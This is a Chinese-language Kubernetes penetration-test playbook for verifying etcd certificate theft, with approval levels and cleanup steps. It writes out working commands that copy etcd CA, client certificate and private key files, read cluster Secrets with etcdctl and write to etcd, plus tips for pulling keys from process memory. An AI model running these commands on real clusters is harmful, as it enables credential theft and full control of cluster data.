---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-2.9, AS-4.4]
mapped_compliance_families: [etcd安全, 文件权限]
---

# etcd-cert-theft — etcd 证书文件窃取

攻击者获取节点上 etcd 的 CA 证书与 peer/client 证书文件（权限宽松或可读），利用其直连 etcd 集群或伪装成合法 etcd member，实现对集群存储的完全控制。

---

## 1. 前置条件

- 节点文件系统中存在 etcd 证书文件（/etc/kubernetes/pki/etcd/）
- 文件权限宽松（可读，非 600 root 专属）或攻击者已具备节点 root/container 权限
- 证书可用于图中读取：CA 证书 + client 证书 + client key

检查命令：
```bash
# [L0] 检查 etcd 证书目录文件权限
ls -la /etc/kubernetes/pki/etcd/
# 期望输出: 默认应为 root:root 600；若属主非 root 或权限含 r-x → 可被窃取

# [L0] 检查 etcd 启动参数引用的证书路径
ps aux | grep etcd | grep -oE '\-\-(trusted-ca-file|cert-file|key-file|peer-trusted-ca-file|peer-cert-file|peer-key-file)=\S+'
# 期望输出: /etc/kubernetes/pki/etcd/ca.crt /etc/kubernetes/pki/etcd/server.crt 等
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：列出 etcd 全部证书文件
ls -la /etc/kubernetes/pki/etcd/
# 期望输出: ca.crt manager.crt server.crt peer.crt member.crt 等，含权限/属主

# [L0] 宿主机观察：确认证书文件具体权限位
stat -c '%a %U:%G %n' /etc/kubernetes/pki/etcd/*.crt /etc/kubernetes/pki/etcd/*.key 2>/dev/null
# 期望输出: 应为 600%U:%G；宽松权限含 644/755 或属主非 root → 漏洞

# [L1] 容器内观察（节点权限已获）：读取 CA 证书
kubectl exec -n <ns> <pod> -- cat /etc/kubernetes/pki/etcd/ca.crt | openssl x509 -text -noout | head -20
# 期望输出: CA 证书信息（Issuer/Validity/Subject）

# [L1] 容器内观察：读取 client 证书与密钥
kubectl exec -n <ns> <pod> -- ls -la /etc/kubernetes/pki/etcd/ | grep client
# 期望输出: client.crt client.key 文件存在

# [L1] 容器内观察：检查证书有效期
kubectl exec -n <ns> <pod> -- openssl x509 -in /etc/kubernetes/pki/etcd/ca.crt -noout -dates
# 期望输出: notBefore / notAfter 日期
```

## 3. 攻击验证

```bash
# [L1] 攻击验证：读取 CA 证书到本地
kubectl exec -n <ns> <pod> -- cat /etc/kubernetes/pki/etcd/ca.crt > /tmp/etcd-ca.crt
# 期望输出: 无报错

# [L1] 攻击验证：读取 client 证书
kubectl exec -n <ns> <pod> -- cat /etc/kubernetes/pki/etcd/server.crt > /tmp/etcd-client.crt
# 期望输出: 无报错（PEM 头 -----BEGIN CERTIFICATE-----）

# [L1] 攻击验证：读取 client 私钥
kubectl exec -n <ns> <pod> -- cat /etc/kubernetes/pki/etcd/server.key > /tmp/etcd-client.key
# 期望输出: 无报错（PEM 头 -----BEGIN PRIVATE KEY-----）

# [L2] 攻击验证：利用窃取的证书直连 etcd 集群
etcdctl --endpoints=https://<node-ip>:2379 \
  --cacert=/tmp/etcd-ca.crt \
  --cert=/tmp/etcd-client.crt \
  --key=/tmp/etcd-client.key \
  get /registry/secrets/ --prefix --keys-only 2>&1 | head -10
# 期望输出: 列出全部 Secret Key（成功冒用证书访问 etcd）

# [L2] 攻击验证：读取特定 Secret 内容
etcdctl --endpoints=https://<node-ip>:2379 \
  --cacert=/tmp/etcd-ca.crt \
  --cert=/tmp/etcd-client.crt \
  --key=/tmp/etcd-client.key \
  get /registry/secrets/default/<secret-name> | strings | head -10
# 期望输出: Secret 明文 data

# [L2] 攻击验证：利用证书写入标记 Key 证明完全控制
etcdctl --endpoints=https://<node-ip>:2379 \
  --cacert=/tmp/etcd-ca.crt \
  --cert=/tmp/etcd-client.crt \
  --key=/tmp/etcd-client.key \
  put /tmp/cert-theft-poc "etcd cert theft confirmed"
# 期望输出: OK

# [L2] 清理
etcdctl --endpoints=https://<node-ip>:2379 \
  --cacert=/tmp/etcd-ca.crt \
  --cert=/tmp/etcd-client.crt \
  --key=/tmp/etcd-client.key \
  del /tmp/cert-theft-poc
# 期望输出: 1
rm /tmp/etcd-ca.crt /tmp/etcd-client.crt /tmp/etcd-client.key
# 期望输出: 无报错
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：本地 /tmp 无 etcd 证书
ls /tmp/etcd-*.crt /tmp/etcd-*.key 2>&1
# 期望输出: No such file or directory

# [L0] 攻击后环境对比：本地拷贝了证书文件
ls /tmp/etcd-ca.crt /tmp/etcd-client.crt /tmp/etcd-client.key
# 期望输出: 三个文件存在

# [L1] 攻击前：无证书时连接 etcd 被拒
etcdctl --endpoints=https://<node-ip>:2379 get / --prefix --keys-only 2>&1
# 期望输出: x509: certificate signed by unknown authority

# [L1] 攻击后：用窃取的证书连接成功
etcdctl --endpoints=https://<node-ip>:2379 \
  --cacert=/tmp/etcd-ca.crt --cert=/tmp/etcd-client.crt --key=/tmp/etcd-client.key \
  get / --prefix --keys-only 2>&1 | head -3
# 期望输出: /registry/apiregistration.k8s.io/... → 证明证书窃取成功绕过认证

# [L2] 攻击前：etcd 中无 /tmp/cert-theft-poc Key
etcdctl --endpoints=https://<node-ip>:2379 \
  --cacert=/tmp/etcd-ca.crt --cert=/tmp/etcd-client.crt --key=/tmp/etcd-client.key \
  get /tmp/cert-theft-poc
# 期望输出: 无输出（Key 不存在）

# [L2] 攻击后：写入并确认 Key 存在
etcdctl --endpoints=https://<node-ip>:2379 \
  --cacert=/tmp/etcd-ca.crt --cert=/tmp/etcd-client.crt --key=/tmp/etcd-client.key \
  get /tmp/cert-theft-poc
# 期望输出: /tmp/cert-theft-poc → etcd cert theft confirmed → 证明完全控制 etcd
```

差分结论：攻击前无证书时无法连接 etcd，攻击后利用从节点文件系统窃取的认证证书直连 etcd 集群并写入数据，证明证书文件权限缺失导致 etcd 鉴权被全面绕过。

## 5. 绕过策略

```bash
# [L1] 检查证书文件是否被命名空间默认挂载到 Pod
kubectl exec -n <ns> <pod> -- mount | grep etcd
# 若 /etc/kubernetes 被挂载到 Pod → 直接读取证书

# [L1] 检查证书文件是否可通过 hostPath 挂载读取
kubectl get pod <pod-name> -n <ns> -o yaml | grep -A3 hostPath | grep -E '/etc|/etc/kubernetes'
# 若 hostPath 挂载含 /etc/kubernetes → 容器可读证书

# 绕过方式：
# - [L2] 若 .key 文件权限 600 root 但容器具备 ptrace 能力（CAP_SYS_PTRACE），通过 /proc/<etcd_pid>/mem 读取内存中的密钥
# - [L1] 若证书文件在同一节点其他路径（如 /var/lib/etcd/）有备份，尝试替代路径
# - [L2] 若证书加密存储但解密脚本在某配置中，先获取解密密钥再解密证书
# - [L1] 若攻击已具备节点 shell 权限但证书权限严格，等 etcd 进程重启时通过 /proc/ 监控获取
```

## 6. 证伪条件

```bash
# [L0] etcd 证书目录不存在或文件不可读
ls -la /etc/kubernetes/pki/etcd/ 2>&1
# 输出: No such file or directory → 证伪

# [L0] 证书文件权限严格 600 root 专属
stat -c '%a %U:%G' /etc/kubernetes/pki/etcd/*.key 2>/dev/null
# 输出: 600 root:root → 不易被非 root 读取 → 证伪（除非额外能力）

# [L1] 容器内无法读取证书目录
kubectl exec -n <ns> <pod> -- ls /etc/kubernetes/pki/etcd/ 2>&1
# 输出: Permission denied / No such file → 证伪

# [L1] 容器无 etcd 证书路径挂载
kubectl get pod <pod-name> -n <ns> -o yaml | grep -c "pki/etcd"
# 输出: 0 → 证伪

# [L2] 用读取的证书连接 etcd 失败
etcdctl --endpoints=https://<node-ip>:2379 --cacert=/tmp/x.crt --cert=/tmp/y.crt --key=/tmp/z.key get / --prefix --keys-only 2>&1
# 输出: x509 certificate error 或 connection refused → 证伪（证书无效或非 etcd 证书）
```

## 7. 审批级别

- **L2** 攻击验证（拷贝证书、直连 etcd、写入 Key）→ **Level 4**（复制凭证并利用，需人工确认）
- **L1** 容器内探测（cat/ls 证书文件）→ **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察（ls、stat 等命令验证权限）→ **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Credential Access
- **Technique ID**: T1552
- **Technique Name**: Unsecured Credentials
- **描述**: 攻击者从节点文件系统窃取 etcd 节点间通信与客户端认证的 CA 证书及私钥，利用其冒充合法 etcd member 直连集群存储，绕过 K8s 控制面全部认证，实现对 Secret/ConfigMap 等数据的完全控制。